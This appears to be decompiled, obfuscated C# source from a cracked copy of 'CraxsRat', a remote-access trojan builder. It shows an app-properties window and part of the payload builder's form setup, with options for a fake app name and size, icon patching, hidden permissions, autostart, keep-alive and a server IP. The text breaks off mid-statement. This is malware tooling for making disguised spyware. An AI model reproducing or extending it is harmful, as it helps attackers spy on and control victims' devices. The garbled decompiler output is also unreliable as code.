// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.AppsProperties
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

#nullable disable
namespace Craxs_Rat
{
  [DesignerGenerated]
  public class AppsProperties : Form
  {
    internal virtual PictureBox BoxIcons
    {
      get => ((Build) this)._BoxIcons;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.BoxIcons_Click);
label_1:
        int num1 = -72272872;
        while (true)
        {
          int num2 = num1;
          uint num3;
          PictureBox boxIcons;
          switch ((num3 = (uint) (1646980926 + 740947717 - (-(~(1981520167 * (-828064698 ^ 139129825) + (-1605967230 - 1988313310 ^ 2121463694 - -111207399)) - ~num2) ^ (289867475 ^ 778457356) + (651084335 + 1502721012)))) % 8U)
          {
            case 0:
              boxIcons = ((Build) this)._BoxIcons;
              int num4 = boxIcons == null ? -699676267 : (num4 = 597825899);
              num1 = num4 ^ (int) num3 * 1175969504;
              continue;
            case 1:
              ((Build) this)._BoxIcons = value;
              num1 = -1777181471;
              continue;
            case 2:
              goto label_1;
            case 3:
              boxIcons = ((Build) this)._BoxIcons;
              num1 = (int) num3 * -119391577 ^ 1171012035;
              continue;
            case 4:
              goto label_3;
            case 5:
              int num5 = boxIcons == null ? 1643847947 : (num5 = -1696168547);
              num1 = num5 ^ (int) num3 * 977000877;
              continue;
            case 6:
              boxIcons.Click += eventHandler;
              num1 = (int) num3 * 2127351157 ^ -1448035117;
              continue;
            case 7:
              boxIcons.Click -= eventHandler;
              num1 = (int) num3 * -1095275906 ^ 1936682016;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual Panel BOXPNL1
    {
      get => ((Build) this)._BOXPNL1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Build) this)._BOXPNL1 = value;
    }

    internal virtual Label LAppInstallTime
    {
      get => ((Build) this)._LAppInstallTime;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Build) this)._LAppInstallTime = value;
    }

    internal virtual Label LAppFlag
    {
      get => ((Build) this)._LAppFlag;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Build) this)._LAppFlag = value;
    }

    internal virtual Label LAppName
    {
      get => ((Build) this)._LAppName;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Build) this)._LAppName = value;
    }

    internal virtual Timer TOpacity
    {
      get => ((Build) this)._TOpacity;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.TOpacity_Tick);
label_1:
        int num1 = 827446996;
        Timer topacity;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~(num1 - (-(-1600444703 * -2090681855) ^ ~(~~685391425 ^ 2052016026 - ~1604569960)) - ~(~(696015985 * 300845770) + (1774290195 + ~24226169)))) % 8U)
          {
            case 0:
              ((Build) this)._TOpacity = value;
              num1 = 1198498317;
              continue;
            case 1:
              topacity.Tick += eventHandler;
              num1 = (int) num2 * 1003790032 ^ -1700369688;
              continue;
            case 2:
              goto label_3;
            case 3:
              int num3 = topacity == null ? 1427572287 : (num3 = 34143046);
              num1 = num3 ^ (int) num2 * 533700111;
              continue;
            case 4:
              goto label_1;
            case 5:
              topacity = ((Build) this)._TOpacity;
              int num4 = topacity == null ? 1421843224 : (num4 = 309545953);
              num1 = num4 ^ (int) num2 * 212389280;
              continue;
            case 6:
              topacity = ((Build) this)._TOpacity;
              num1 = (int) num2 * -827896433 ^ 1837015557;
              continue;
            case 7:
              topacity.Tick -= eventHandler;
              num1 = (int) num2 * -2071332843 ^ -37308767;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual Label LPermissions
    {
      get => ((Build) this)._LPermissions;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Build) this)._LPermissions = value;
    }

    public AppsProperties()
    {
label_1:
      int num1 = 921394446;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-((num1 ^ 1862393654 ^ ~887733127 - 1591985352 - 1839331118 ^ -590518643 * (2116719887 * (94839995 + 2011909106 ^ -2079844127))) * -1958881797) * -2042713557)) % 4U)
        {
          case 0:
            goto label_1;
          case 2:
            this.Load += new EventHandler(this.AppsProperties_Load);
            num1 = (int) num2 * -940106324 ^ 1469630801;
            continue;
          case 3:
            ((Build) this).Title = EXGuarder.\u0034E54066E;
            num1 = (int) num2 * -2112089541 ^ 1691095486;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      // ISSUE: reference to a compiler-generated method
      ((Applications._Closure\u0024__) this).InitializeComponent();
      this.Font = Settings.f;
    }

    private void AppsProperties_Load(object sender, EventArgs e)
    {
      this.Icon = new Icon(Settings.res_Path + EXGuarder.\u0030C556631);
label_1:
      int num1 = -33412051;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (-(~(-((586214781 - 1186901263 ^ 873211055 * 1309605218) + -~-253971929 + 875409063) - num2) ^ ~~-750075950 + (-712494735 + (-73778888 ^ 1576242233)) ^ -~-1844223528) - 1918098941)) % 5U)
        {
          case 0:
            this.TOpacity.Interval = Settings.T_Interval;
            this.TOpacity.Enabled = true;
            num1 = (int) num3 * -1360877318 ^ -769665989;
            continue;
          case 1:
            goto label_3;
          case 2:
            goto label_1;
          case 3:
            this.Text = ((Build) this).Title;
            num1 = (int) num3 * 1392078625 ^ -1904502376;
            continue;
          case 4:
            this.SpyStyle();
            num1 = (int) num3 * 1372735652 ^ 1428382442;
            continue;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:;
    }

    private void SpyStyle()
    {
      IEnumerator<Panel> enumerator1;
      try
      {
        enumerator1 = this.Controls.OfType<Panel>().GetEnumerator();
label_1:
        int num1 = -1983406925;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~((((num1 ^ -(719278469 * -1726302016) * 1648210787 - -807019139 ^ ~--1907427244 * 2034389913 + 1182161931) - --(-1331662507 - 2058074053) * 295774287) * -571333831 ^ -1811011558 ^ 985366730 - 2259669) - (-1644680572 - 1069413334))) % 5U)
          {
            case 0:
              enumerator1.Current.BackColor = Settings.DefaultColor_Background;
              num1 = -2120254354;
              continue;
            case 1:
              num1 = (int) num2 * -140227291 ^ 1047789770;
              continue;
            case 2:
              int num3;
              num1 = num3 = enumerator1.MoveNext() ? -1893470955 : (num3 = -1686161702);
              continue;
            case 3:
              goto label_1;
            default:
              goto label_11;
          }
        }
      }
      finally
      {
        if (enumerator1 != null)
        {
label_7:
          int num4 = 185139265;
          while (true)
          {
            uint num5;
            switch ((num5 = (uint) ~((((num4 ^ -(719278469 * -1726302016) * 1648210787 - -807019139 ^ ~--1907427244 * 2034389913 + 1182161931) - --(-1331662507 - 2058074053) * 295774287) * -571333831 ^ -1811011558 ^ 985366730 - 2259669) - (-1644680572 - 1069413334))) % 3U)
            {
              case 0:
                goto label_7;
              case 1:
                enumerator1.Dispose();
                num4 = (int) num5 * 1497472909 ^ 1027049725;
                continue;
              default:
                goto label_10;
            }
          }
        }
label_10:;
      }
label_11:
      IEnumerator<Label> enumerator2;
      try
      {
        enumerator2 = this.BOXPNL1.Controls.OfType<Label>().GetEnumerator();
label_12:
        int num6 = 407778657;
        while (true)
        {
          uint num7;
          switch ((num7 = (uint) ~((((num6 ^ -(719278469 * -1726302016) * 1648210787 - -807019139 ^ ~--1907427244 * 2034389913 + 1182161931) - --(-1331662507 - 2058074053) * 295774287) * -571333831 ^ -1811011558 ^ 985366730 - 2259669) - (-1644680572 - 1069413334))) % 5U)
          {
            case 0:
              goto label_12;
            case 2:
              num6 = (int) num7 * 2045045528 ^ -1252290869;
              continue;
            case 3:
              Label current = enumerator2.Current;
              current.ForeColor = getIconFrmReg.SHFILEINFOW.DefaultColor_Foreground;
              current.BackColor = Settings.DefaultColor_Background;
              num6 = -400262789;
              continue;
            case 4:
              int num8;
              num6 = num8 = enumerator2.MoveNext() ? -693637085 : (num8 = -1387867397);
              continue;
            default:
              goto label_22;
          }
        }
      }
      finally
      {
        if (enumerator2 != null)
        {
label_18:
          int num9 = 565209014;
          while (true)
          {
            uint num10;
            switch ((num10 = (uint) ~((((num9 ^ -(719278469 * -1726302016) * 1648210787 - -807019139 ^ ~--1907427244 * 2034389913 + 1182161931) - --(-1331662507 - 2058074053) * 295774287) * -571333831 ^ -1811011558 ^ 985366730 - 2259669) - (-1644680572 - 1069413334))) % 3U)
            {
              case 0:
                goto label_18;
              case 1:
                enumerator2.Dispose();
                num9 = (int) num10 * 2076164574 ^ 139352872;
                continue;
              default:
                goto label_21;
            }
          }
        }
label_21:;
      }
label_22:
      IEnumerator<PictureBox> enumerator3;
      try
      {
        enumerator3 = this.BOXPNL1.Controls.OfType<PictureBox>().GetEnumerator();
label_23:
        int num11 = -444921932;
        PictureBox current;
        while (true)
        {
          uint num12;
          switch ((num12 = (uint) ~((((num11 ^ -(719278469 * -1726302016) * 1648210787 - -807019139 ^ ~--1907427244 * 2034389913 + 1182161931) - --(-1331662507 - 2058074053) * 295774287) * -571333831 ^ -1811011558 ^ 985366730 - 2259669) - (-1644680572 - 1069413334))) % 6U)
          {
            case 0:
              int num13;
              num11 = num13 = enumerator3.MoveNext() ? 209948898 : (num13 = -305949737);
              continue;
            case 1:
              current.BackColor = Settings.DefaultColor_Background;
              num11 = (int) num12 * 1537009063 ^ 1240261354;
              continue;
            case 3:
              current = enumerator3.Current;
              num11 = 1529288168;
              continue;
            case 4:
              goto label_23;
            case 5:
              num11 = (int) num12 * -1464360919 ^ 123297344;
              continue;
            default:
              goto label_34;
          }
        }
      }
      finally
      {
        if (enumerator3 != null)
        {
label_30:
          int num14 = -142093527;
          while (true)
          {
            uint num15;
            switch ((num15 = (uint) ~((((num14 ^ -(719278469 * -1726302016) * 1648210787 - -807019139 ^ ~--1907427244 * 2034389913 + 1182161931) - --(-1331662507 - 2058074053) * 295774287) * -571333831 ^ -1811011558 ^ 985366730 - 2259669) - (-1644680572 - 1069413334))) % 3U)
            {
              case 0:
                goto label_30;
              case 1:
                enumerator3.Dispose();
                num14 = (int) num15 * -55898003 ^ 63657197;
                continue;
              default:
                goto label_33;
            }
          }
        }
label_33:;
      }
label_34:
      this.LPermissions.ForeColor = Settings.DefaultColor_ColorTitles;
    }

    private void TOpacity_Tick(object sender, EventArgs e)
    {
      if (this.Opacity == 1.0)
        goto label_4;
label_1:
      int num1 = -1360398864;
label_2:
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (-((~(-816992499 - -498839323) * 117864565 ^ (1134103683 ^ 1840937499 * -1020060166) - 36500153) - -31427825 * (-836940285 * 185990325 * 1905344263 * -418796261) - num2) - ~(-1029720550 * 14323005) + ~~75546411)) % 5U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num3 * 565620831 ^ -616428040;
            continue;
          case 2:
            this.Opacity += 0.1;
            num1 = (int) num3 * -1899838961 ^ -414179810;
            continue;
          case 3:
            goto label_4;
          case 4:
            goto label_3;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:
      return;
label_4:
      this.TOpacity.Enabled = false;
      num1 = 287709458;
      goto label_2;
    }

    private void BoxIcons_Click(object sender, EventArgs e)
    {
      Process.Start(string.Format(EXGuarder.\u00318424438, (object) EXGuarder.\u0036D6A5435, (object) Conversions.ToString(this.BoxIcons.Tag)));
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing)
          return;
label_1:
        int num1 = -319922969;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((-num1 - (-1620194927 - -1616123311) - (-1652887050 ^ --2023403434) * 1068218943 + (1125546383 * 1208935494 + (-775002075 ^ -1655961122))) * -96406201 - 1998894916)) % 4U)
          {
            case 0:
              goto label_3;
            case 1:
              ((Build) this).components.Dispose();
              num1 = (int) num2 * 1627792684 ^ -1575752827;
              continue;
            case 2:
              int num3 = ((Build) this).components == null ? -2060580475 : (num3 = -150726962);
              num1 = num3 ^ (int) num2 * 52186510;
              continue;
            case 3:
              goto label_1;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      ((Build) this).components = (IContainer) new System.ComponentModel.Container();
label_1:
      int num1 = -1927322588;
      ComponentResourceManager componentResourceManager;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 - -~(-(-1687670825 ^ -2038123308) - (--1714993253 + (-1154981502 ^ 1550422836))) ^ --~(1700128389 - 68549115) ^ ~(-240487314 - (-872360492 ^ -729564357)) ^ -1682390428 - 1531845211 ^ ~758269345 ^ ~658973669)) % 1294U)
        {
          case 0:
            ((Build) this).Label31.Margin = new Padding(4, 0, 4, 0);
            num1 = (int) num2 * 54255452 ^ 1869947281;
            continue;
          case 1:
            ((Build) this).sizelabel.ForeColor = Color.White;
            num1 = (int) num2 * -850814177 ^ 1896795699;
            continue;
          case 2:
            ((Build) this).CheckDoze.CheckBoxColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -620578159 ^ 1906905703;
            continue;
          case 3:
            ((Build) this).Label48.Name = EXGuarder.\u0032D46795E;
            ((Build) this).Label48.Size = new Size(208, 34);
            num1 = (int) num2 * -1052173745 ^ 1003146889;
            continue;
          case 4:
            ((Build) this).Label8.Name = EXGuarder.\u0034B5F3038;
            num1 = (int) num2 * -1670777324 ^ -845878561;
            continue;
          case 5:
            ((Build) this).delayaccesstext.BackColor = Color.FromArgb(34, 34, 34);
            ((Build) this).delayaccesstext.BorderStyle = BorderStyle.FixedSingle;
            ((Build) this).delayaccesstext.ForeColor = Color.White;
            num1 = (int) num2 * 347558324 ^ 1493333877;
            continue;
          case 6:
            ((Build) this).addmintor.Cursor = Cursors.Hand;
            num1 = (int) num2 * -1397366631 ^ 1928344517;
            continue;
          case 7:
            ((Build) this).TabPage12 = new TabPage();
            num1 = (int) num2 * 1145088591 ^ 1933600302;
            continue;
          case 8:
            ((Build) this).clonecheck.Font = new Font(EXGuarder.\u00339780D77, 12f);
            num1 = (int) num2 * 1937048026 ^ -1430961609;
            continue;
          case 9:
            ((Build) this).checkautostart.Text = EXGuarder.\u0034B024F4A;
            num1 = (int) num2 * 1221183116 ^ -901415138;
            continue;
          case 10:
            ((Build) this).logtitletext.Name = EXGuarder.\u003533F1420;
            num1 = (int) num2 * 1398388876 ^ -1886419130;
            continue;
          case 11:
            ((Build) this).CheckFakeSize.CheckBoxColor = Color.FromArgb(30, 136, 229);
            num1 = (int) num2 * 323759809 ^ 964622735;
            continue;
          case 12:
            ((Build) this).Label45.Font = new Font(EXGuarder.\u00339780D77, 15f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            ((Build) this).Label45.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((Build) this).Label45.Location = new Point(516, 183);
            num1 = (int) num2 * -2025883649 ^ 1486243814;
            continue;
          case 13:
            ((Build) this).CheckDoze = new DrakeUICheckBox();
            num1 = (int) num2 * -2091392988 ^ 770796561;
            continue;
          case 14:
            ((Build) this).checkcaptureonce.TextAlign = ContentAlignment.TopCenter;
            num1 = (int) num2 * -837773972 ^ 426336207;
            continue;
          case 15:
            ((Build) this).panemnitor.Controls.Add((Control) ((Build) this).linkmonitor);
            num1 = (int) num2 * 1031108461 ^ 1393060579;
            continue;
          case 16:
            ((Build) this).CheckIconPatch.Style = UIStyle.Custom;
            ((Build) this).CheckIconPatch.StyleCustomMode = true;
            num1 = (int) num2 * 1453065664 ^ 26280454;
            continue;
          case 17:
            ((Build) this).TextBox1.Font = new Font(EXGuarder.\u00339780D77, 12f);
            num1 = (int) num2 * -923477458 ^ -1190886063;
            continue;
          case 18:
            ((Build) this).Primslist.ItemSelectForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -749247607 ^ -118185123;
            continue;
          case 19:
            ((Build) this).TextVersion.Name = EXGuarder.\u00300200163;
            ((Build) this).TextVersion.Padding = new Padding(7, 6, 7, 6);
            num1 = (int) num2 * -548043468 ^ -747293743;
            continue;
          case 20:
            ((Build) this).Label31.AutoSize = true;
            num1 = (int) num2 * 854178820 ^ 231035730;
            continue;
          case 21:
            ((Build) this).TextPackage.Location = new Point(615, 391);
            num1 = (int) num2 * -290490082 ^ 1534737382;
            continue;
          case 22:
            ((Build) this).CheckSkipre.ForeColor = Color.White;
            ((Build) this).CheckSkipre.Location = new Point(602, 88);
            num1 = (int) num2 * 15209284 ^ 1252605730;
            continue;
          case 23:
            ((Build) this).Button1.FillSelectedColor = Color.FromArgb(254, 0, 0);
            num1 = (int) num2 * -1922488810 ^ -1184582275;
            continue;
          case 24:
            ((Build) this).Label31.Size = new Size(142, 24);
            ((Build) this).Label31.TabIndex = 38;
            ((Build) this).Label31.Text = EXGuarder.\u003666B3A71;
            num1 = (int) num2 * 2010971217 ^ 1370493546;
            continue;
          case 25:
            ((Build) this).sizelabel.Font = new Font(EXGuarder.\u00339780D77, 15f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * 882724508 ^ 194561606;
            continue;
          case 26:
            ((Build) this).tracklist.TabIndex = 103;
            num1 = (int) num2 * -231095800 ^ 1467208628;
            continue;
          case 27:
            this.Opacity = 0.0;
            this.ShowIcon = false;
            num1 = (int) num2 * -1431099433 ^ -1359539902;
            continue;
          case 28:
            ((Build) this).TABCTRL.SuspendLayout();
            ((Build) this).TabPage10.SuspendLayout();
            num1 = (int) num2 * -397205912 ^ 127716994;
            continue;
          case 29:
            ((Build) this).addmintor.BackColor = Color.Transparent;
            num1 = (int) num2 * -41216397 ^ 1613427020;
            continue;
          case 30:
            ((Build) this).explainmonitortext.Multiline = true;
            num1 = (int) num2 * 115139151 ^ 2084149968;
            continue;
          case 31:
            ((Build) this).Label37.Text = EXGuarder.\u00332135058;
            num1 = (int) num2 * -902634747 ^ -1937492870;
            continue;
          case 32:
            ((Build) this).Panel5.Controls.Add((Control) ((Build) this).Label47);
            ((Build) this).Panel5.Controls.Add((Control) ((Build) this).Label46);
            num1 = (int) num2 * -1922853456 ^ -79020300;
            continue;
          case 33:
            ((Build) this).TextBox1.Name = EXGuarder.\u0035B5A6662;
            num1 = (int) num2 * -1976207860 ^ -967753905;
            continue;
          case 34:
            ((Build) this).Label22.ForeColor = Color.White;
            ((Build) this).Label22.Location = new Point(11, 95);
            num1 = (int) num2 * 174416665 ^ -1238199634;
            continue;
          case 35:
            ((Build) this).Textfakename.FillColor = Color.Black;
            num1 = (int) num2 * -765110307 ^ -370604969;
            continue;
          case 36:
            ((Build) this).Label7.Text = EXGuarder.\u003500A6952;
            num1 = (int) num2 * -988100706 ^ 1811852870;
            continue;
          case 37:
            ((Build) this).trgtbkg.Maximum = (double) int.MaxValue;
            num1 = (int) num2 * 1899398697 ^ 1889821040;
            continue;
          case 38:
            ((Build) this).CheckRecord.Name = EXGuarder.\u003723B756B;
            num1 = (int) num2 * -425684873 ^ -348692314;
            continue;
          case 39:
            ((Build) this).Panel6.Controls.Add((Control) ((Build) this).dscriptext);
            num1 = (int) num2 * 243308370 ^ 830784491;
            continue;
          case 40:
            ((Build) this).checkprotector.Name = EXGuarder.\u003052E6E69;
            num1 = (int) num2 * 1034690664 ^ -837906917;
            continue;
          case 41:
            ((Build) this).DrakeUIAvatar2.ForeColor = Color.White;
            ((Build) this).DrakeUIAvatar2.Location = new Point(11, 346);
            ((Build) this).DrakeUIAvatar2.Margin = new Padding(4);
            num1 = (int) num2 * -38666201 ^ 849541420;
            continue;
          case 42:
            ((Build) this).Label30.Text = EXGuarder.\u00377076367;
            ((Build) this).Panel4.BorderStyle = BorderStyle.FixedSingle;
            num1 = (int) num2 * 28212784 ^ -508768398;
            continue;
          case 43:
            ((Build) this).po.Padding = new Padding(7, 6, 7, 6);
            num1 = (int) num2 * 1402760218 ^ -2085081623;
            continue;
          case 44:
            ((Build) this).dscriptext.Location = new Point(290, 558);
            num1 = (int) num2 * -1759637814 ^ -766561956;
            continue;
          case 45:
            ((Build) this).CheckDoze.Padding = new Padding(22, 0, 0, 0);
            num1 = (int) num2 * 1892799814 ^ 1568365106;
            continue;
          case 46:
            ((Build) this).Panel3.Controls.Add((Control) ((Build) this).Label12);
            num1 = (int) num2 * 1557887818 ^ -1957662271;
            continue;
          case 47:
            ((Build) this).checkcaptureonce.Cursor = Cursors.Hand;
            num1 = (int) num2 * 1802987727 ^ -1166764490;
            continue;
          case 48:
            ((Build) this).TextVersion.Margin = new Padding(5, 6, 5, 6);
            num1 = (int) num2 * -1910924530 ^ 2072652052;
            continue;
          case 49:
            ((Build) this).namemonitor.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((Build) this).namemonitor.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num2 * 2002192033 ^ 249389573;
            continue;
          case 50:
            ((Build) this).CheckHidePrims.Text = EXGuarder.\u003566E552A;
            num1 = (int) num2 * 807336418 ^ -1810134988;
            continue;
          case 51:
            ((Build) this).Label24.Name = EXGuarder.\u0030F503E0D;
            num1 = (int) num2 * -500556917 ^ -67133104;
            continue;
          case 52:
            ((Build) this).Panel2.TabIndex = 15;
            ((Build) this).clonecheck.CheckBoxColor = Color.FromArgb(192, 0, 0);
            ((Build) this).clonecheck.Cursor = Cursors.Hand;
            num1 = (int) num2 * -1914965684 ^ 1851128357;
            continue;
          case 53:
            ((Build) this).Label40.TabIndex = 105;
            ((Build) this).Label40.Text = EXGuarder.\u003500A6952;
            ((Build) this).Label36.AutoSize = true;
            num1 = (int) num2 * -160408553 ^ -514058850;
            continue;
          case 54:
            ((Build) this).explaintoolstext.ForeColor = SystemColors.GradientActiveCaption;
            ((Build) this).explaintoolstext.Location = new Point(0, 539);
            num1 = (int) num2 * -1164612 ^ 1679429410;
            continue;
          case 55:
            ((Build) this).Label6.TabIndex = 51;
            ((Build) this).Label6.Text = EXGuarder.\u003500A6952;
            num1 = (int) num2 * 1440071658 ^ -1128504975;
            continue;
          case 56:
            ((Build) this).TabPage9.BackColor = Color.White;
            ((Build) this).TabPage9.Controls.Add((Control) ((Build) this).Panel3);
            num1 = (int) num2 * -730397243 ^ 1703417401;
            continue;
          case 57:
            ((Build) this).Panel5.Dock = DockStyle.Fill;
            num1 = (int) num2 * -1905346792 ^ -1049555028;
            continue;
          case 58:
            ((Build) this).fakepanel.Size = new Size(518, 290);
            num1 = (int) num2 * -1170569056 ^ -1056024745;
            continue;
          case 59:
            ((Build) this).MainText.Margin = new Padding(4, 0, 4, 0);
            num1 = (int) num2 * -412766074 ^ -1071789840;
            continue;
          case 60:
            ((Build) this).addactiv.ForeColor = Color.White;
            num1 = (int) num2 * 1568540885 ^ 422314514;
            continue;
          case 61:
            ((Build) this).comboproms.FillColor = Color.Black;
            num1 = (int) num2 * 828470781 ^ 1636101515;
            continue;
          case 62:
            ((Build) this).randomverbtn.SymbolSize = 30;
            num1 = (int) num2 * -500141298 ^ -1069804471;
            continue;
          case 63:
            ((Build) this).Label11.Name = EXGuarder.\u0034E1F4C4C;
            num1 = (int) num2 * -1197913806 ^ -999486335;
            continue;
          case 64:
            ((Build) this).Label33 = new Label();
            num1 = (int) num2 * -898407731 ^ 119635159;
            continue;
          case 65:
            ((Build) this).removmonitor.FillColor = Color.Transparent;
            ((Build) this).removmonitor.Font = new Font(EXGuarder.\u00339780D77, 12f);
            num1 = (int) num2 * -1823631636 ^ 512867235;
            continue;
          case 66:
            ((Build) this).Checksuper.Size = new Size(338, 29);
            num1 = (int) num2 * -2001493715 ^ 1683866186;
            continue;
          case 67:
            ((Build) this).PictureBox1.SizeMode = PictureBoxSizeMode.Zoom;
            num1 = (int) num2 * -1837732663 ^ 1288798670;
            continue;
          case 68:
            ((Build) this).Label31 = new Label();
            num1 = (int) num2 * -492273421 ^ -1816199678;
            continue;
          case 69:
            ((Build) this).Label11.BackColor = Color.Transparent;
            num1 = (int) num2 * -1563181737 ^ 1069136526;
            continue;
          case 70:
            ((Build) this).Label36 = new Label();
            ((Build) this).Label26 = new Label();
            num1 = (int) num2 * 1239949767 ^ 1526911920;
            continue;
          case 71:
            ((Build) this).Primslist.FillDisableColor = Color.FromArgb(20, 31, 20);
            num1 = (int) num2 * 1133649672 ^ -289164949;
            continue;
          case 72:
            ((Build) this).TabPage12.Controls.Add((Control) ((Build) this).Panel6);
            num1 = (int) num2 * 1628101085 ^ 178895729;
            continue;
          case 73:
            ((Build) this).TABCTRL.Dock = DockStyle.Fill;
            num1 = (int) num2 * -1546063606 ^ -401195411;
            continue;
          case 74:
            ((Build) this).Panel5.Controls.Add((Control) ((Build) this).CheckAOX);
            num1 = (int) num2 * -1520863530 ^ 426259218;
            continue;
          case 75:
            ((Build) this).CheckSkipre.CheckBoxColor = Color.FromArgb(30, 136, 229);
            num1 = (int) num2 * 2067973010 ^ -172698395;
            continue;
          case 76:
            ((Build) this).Label14.Size = new Size(16, 19);
            num1 = (int) num2 * -1494270203 ^ 1645726737;
            continue;
          case 77:
            ((Build) this).checksignver.CausesValidation = false;
            num1 = (int) num2 * 316889388 ^ -485480773;
            continue;
          case 78:
            ((Build) this).TextVersion.Radius = 10;
            ((Build) this).TextVersion.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((Build) this).TextVersion.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num2 * 55711717 ^ 1240456270;
            continue;
          case 79:
            ((Build) this).PictureBox1.Size = new Size(136, 98);
            num1 = (int) num2 * -1197506188 ^ -403967528;
            continue;
          case 80:
            ((Build) this).Button3.Margin = new Padding(4, 5, 4, 5);
            num1 = (int) num2 * -1833604157 ^ -1024860626;
            continue;
          case 81:
            ((Build) this).addactiv.Location = new Point(11, 46);
            ((Build) this).addactiv.Margin = new Padding(4);
            ((Build) this).addactiv.Name = EXGuarder.\u00349421700;
            num1 = (int) num2 * -1795900577 ^ 790916628;
            continue;
          case 82:
            ((Build) this).Label16.Margin = new Padding(4, 0, 4, 0);
            ((Build) this).Label16.Name = EXGuarder.\u0031B485842;
            num1 = (int) num2 * -196229834 ^ -174486831;
            continue;
          case 83:
            ((Build) this).tracklist.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -1036822257 ^ 347686650;
            continue;
          case 84:
            ((Build) this).Checksuper.Location = new Point(83, 270);
            num1 = (int) num2 * -1362411164 ^ -686867122;
            continue;
          case 85:
            ((Build) this).Label41.AutoSize = true;
            num1 = (int) num2 * 525582180 ^ 345666001;
            continue;
          case 86:
            ((Build) this).randomidbtn.Style = UIStyle.Custom;
            ((Build) this).randomidbtn.Symbol = 61473;
            num1 = (int) num2 * 1986764619 ^ -875698666;
            continue;
          case 87:
            ((Build) this).keeplivelabel.TabIndex = 28;
            num1 = (int) num2 * 746675849 ^ 577989371;
            continue;
          case 88:
            ((Build) this).TextIP.FillColor = Color.Black;
            num1 = (int) num2 * 893144434 ^ 831848839;
            continue;
          case 89:
            ((Build) this).CheckFakeSize.Location = new Point(183, 584);
            ((Build) this).CheckFakeSize.Margin = new Padding(4);
            ((Build) this).CheckFakeSize.Name = EXGuarder.\u00352343C56;
            ((Build) this).CheckFakeSize.Padding = new Padding(22, 0, 0, 0);
            ((Build) this).CheckFakeSize.Size = new Size(155, 36);
            num1 = (int) num2 * 2069989729 ^ -1912361789;
            continue;
          case 90:
            ((Build) this).DrakeUIAvatar2.FillColor = Color.Transparent;
            ((Build) this).DrakeUIAvatar2.Font = new Font(EXGuarder.\u00339780D77, 12f);
            num1 = (int) num2 * -1027295153 ^ 157207062;
            continue;
          case 91:
            ((Build) this).Panel5.Margin = new Padding(4);
            ((Build) this).Panel5.Name = EXGuarder.\u00367712938;
            num1 = (int) num2 * -92936067 ^ 1835839030;
            continue;
          case 92:
            ((Build) this).bindCtitle.TabIndex = 99;
            ((Build) this).bindCtitle.Text = EXGuarder.\u0033476260C;
            ((Build) this).bindCtitle.TextAlign = HorizontalAlignment.Center;
            ((Build) this).Label10.AutoSize = true;
            ((Build) this).Label10.BackColor = Color.Transparent;
            ((Build) this).Label10.Font = new Font(EXGuarder.\u00339780D77, 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * -1304079785 ^ 2089004790;
            continue;
          case 93:
            ((Build) this).Panel9.BackColor = Color.Black;
            ((Build) this).Panel9.Controls.Add((Control) ((Build) this).DrakeUIAvatar1);
            num1 = (int) num2 * -369116809 ^ -827190252;
            continue;
          case 94:
            ((Build) this).CheckQuick.Size = new Size(338, 29);
            num1 = (int) num2 * -174130292 ^ 173820250;
            continue;
          case 95:
            ((Build) this).Label19.Name = EXGuarder.\u003465F6D16;
            num1 = (int) num2 * -76311239 ^ 1088885599;
            continue;
          case 96:
            ((Build) this).Panel6.Size = new Size(450, 230);
            num1 = (int) num2 * 459016367 ^ 1067871337;
            continue;
          case 97:
            ((Build) this).Label43.TabIndex = 80;
            num1 = (int) num2 * -2012257330 ^ -1818846734;
            continue;
          case 98:
            ((Build) this).checksignver.Location = new Point(0, 0);
            ((Build) this).checksignver.Margin = new Padding(4);
            num1 = (int) num2 * 690116733 ^ -1953587494;
            continue;
          case 99:
